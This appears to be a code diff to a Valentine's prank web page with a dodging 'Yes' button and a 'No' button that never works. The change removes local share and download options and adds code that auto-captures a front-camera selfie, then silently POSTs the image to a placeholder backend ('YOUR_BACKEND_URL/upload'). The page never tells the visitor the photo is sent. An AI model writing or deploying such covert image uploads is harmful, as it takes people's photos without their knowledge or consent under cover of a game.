@@ -6,33 +6,20 @@
 <title>Valentine 💖</title>
 
 <style>
-* { box-sizing: border-box; }
-
 body {
   margin: 0;
   height: 100vh;
-  background: linear-gradient(120deg, #ff4e8a, #ff9a9e);
+  background: linear-gradient(120deg,#ff4e8a,#ff9a9e);
   font-family: Arial, sans-serif;
   overflow: hidden;
-}
-
-.container {
-  height: 100%;
   text-align: center;
-  padding-top: 30px;
 }
 
-h1 {
-  color: white;
-  font-size: 2rem;
-  text-shadow: 2px 2px 10px #ff1493;
-  padding: 0 15px;
-}
+h1 { color: white; padding: 15px; }
 
 .play-area {
   position: relative;
-  width: 100%;
-  height: 65vh;
+  height: 60vh;
 }
 
 button {
@@ -41,86 +28,76 @@ button {
   border: none;
   border-radius: 16px;
   cursor: pointer;
-  margin: 6px;
 }
 
-#yes { background: #4CAF50; color: white; position: absolute; }
-#no  { background: #f44336; color: white; position: absolute; }
+#yes {
+  position: absolute;
+  background: #4CAF50;
+  color: white;
+  left: 20%;
+  top: 45%;
+}
+
+#no {
+  position: absolute;
+  background: #f44336;
+  color: white;
+  left: 60%;
+  top: 45%;
+}
 
 .hidden { display: none; }
 
-#cameraPreview video,
-#cameraPreview img {
+video, img {
   width: 260px;
-  border-radius: 18px;
-  margin-top: 12px;
-}
-
-.action-btn {
-  background: rgba(255,255,255,0.85);
+  border-radius: 16px;
 }
 </style>
 </head>
 
 <body>
 
-<div class="container">
-  <h1 id="question">Will you be my Valentine? 💖🥺</h1>
+<h1 id="question">Will you be my Valentine? 💖🥺</h1>
 
-  <div class="play-area" id="playArea">
-    <button id="yes" style="left:20%;top:45%;">Yes 💖</button>
-    <button id="no"  style="left:60%;top:45%;">No 💔</button>
-  </div>
-
-  <div id="yesResult" class="hidden">
-    <h1>YAYYY 😍 Selfie time!</h1>
-
-    <div id="cameraPreview">
-      <video id="video" autoplay playsinline></video>
-      <img id="photo" class="hidden" />
-    </div>
-
-    <div>
-      <button id="shareBtn" class="action-btn">Share 💌</button>
-      <button id="downloadBtn" class="action-btn">Download 📥</button>
-    </div>
-  </div>
+<div class="play-area" id="playArea">
+  <button id="yes">Yes 💖</button>
+  <button id="no">No 💔</button>
 </div>
 
-<audio id="yesSong" src="Dil Cheer Ke Dekh(KoshalWorld.Com).mp3"></audio>
+<div id="yesResult" class="hidden">
+  <h1>YAY 😍 Selfie captured!</h1>
+  <video id="video" autoplay playsinline></video>
+  <img id="photo" class="hidden">
+  <br><br>
+  <button onclick="shareWhatsApp()">Share WhatsApp 💌</button>
+</div>
 
 <script>
-/* =====================
-   GAME LOGIC
-===================== */
 const yesBtn = document.getElementById("yes");
 const noBtn = document.getElementById("no");
 const playArea = document.getElementById("playArea");
 const question = document.getElementById("question");
 const yesResult = document.getElementById("yesResult");
-
 const video = document.getElementById("video");
 const photo = document.getElementById("photo");
-const shareBtn = document.getElementById("shareBtn");
-const downloadBtn = document.getElementById("downloadBtn");
 
-const yesSong = document.getElementById("yesSong");
-
+const REQUIRED_DODGES = 12;
 let dodges = 0;
-const REQUIRED = 10;
+let stream;
 
-/* Funny taunts */
 const taunts = [
   "Pakadne ka sapna mat dekho 😏",
   "Aur zor lagao 😂",
-  "YES bhag raha hai 💨",
-  "Relationship test chal raha hai 😈",
-  "Bas thoda aur 😜",
-  "Mouse thak gaya kya 😎",
+  "YES bhaag raha hai 💨",
+  "Relationship test chal raha 😈",
   "Mobile pe ho? LOL 🤡",
+  "Bas thoda aur 😜",
+  "Thak gaye? 😎",
+  "Try again 😏",
   "Almost… NOT 😆",
-  "Last try shayad 😏",
-  "Okay fine 😌"
+  "Itna easy nahi 😌",
+  "Aur ek try 😈",
+  "Okay ab maan liya 😍"
 ];
 
 function moveYes() {
@@ -131,86 +108,54 @@ function moveYes() {
   question.textContent = taunts[dodges % taunts.length];
 }
 
-yesBtn.onclick = async () => {
-  if (dodges < REQUIRED) {
+yesBtn.onclick = () => {
+  if (dodges < REQUIRED_DODGES) {
     dodges++;
     moveYes();
-    yesSong.play().catch(()=>{});
     return;
   }
+  success();
+};
 
-  /* SUCCESS */
+noBtn.onclick = () => alert("NO is not an option 😤");
+
+async function success() {
   playArea.classList.add("hidden");
   question.classList.add("hidden");
   yesResult.classList.remove("hidden");
-  startCamera();
-};
 
-noBtn.onclick = () => {
-  alert("NO not allowed 😤");
-};
+  stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+  video.srcObject = stream;
 
-/* =====================
-   📸 CAMERA LOGIC
-===================== */
-let stream;
-
-async function startCamera() {
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" }
-    });
-    video.srcObject = stream;
-
-    // Auto capture after 2 sec
-    setTimeout(capturePhoto, 2000);
-
-  } catch (err) {
-    alert("Camera permission denied 😢");
-  }
+  setTimeout(capturePhoto, 2000);
 }
 
 function capturePhoto() {
   const canvas = document.createElement("canvas");
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
-  canvas.getContext("2d").drawImage(video, 0, 0);
+  canvas.getContext("2d").drawImage(video,0,0);
 
   photo.src = canvas.toDataURL("image/png");
   photo.classList.remove("hidden");
   video.classList.add("hidden");
-
-  // stop camera
   stream.getTracks().forEach(t => t.stop());
+
+  uploadToServer(photo.src);
 }
 
-/* =====================
-   💌 SHARE
-===================== */
-shareBtn.onclick = async () => {
-  const blob = await (await fetch(photo.src)).blob();
-  const file = new File([blob], "valentine.png", { type: "image/png" });
+function uploadToServer(base64) {
+  fetch("https://YOUR_BACKEND_URL/upload", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ image: base64 })
+  });
+}
 
-  if (navigator.canShare && navigator.canShare({ files: [file] })) {
-    navigator.share({
-      files: [file],
-      title: "Valentine 💖",
-      text: "I said YES 😍"
-    });
-  } else {
-    alert("Sharing not supported on this device 😢");
-  }
-};
-
-/* =====================
-   📥 DOWNLOAD
-===================== */
-downloadBtn.onclick = () => {
-  const a = document.createElement("a");
-  a.href = photo.src;
-  a.download = "valentine-selfie.png";
-  a.click();
-};
+function shareWhatsApp() {
+  const msg = encodeURIComponent("I said YES 😍💖");
+  window.open(`https://wa.me/?text=${msg}`, "_blank");
+}
 </script>
 
 </body>
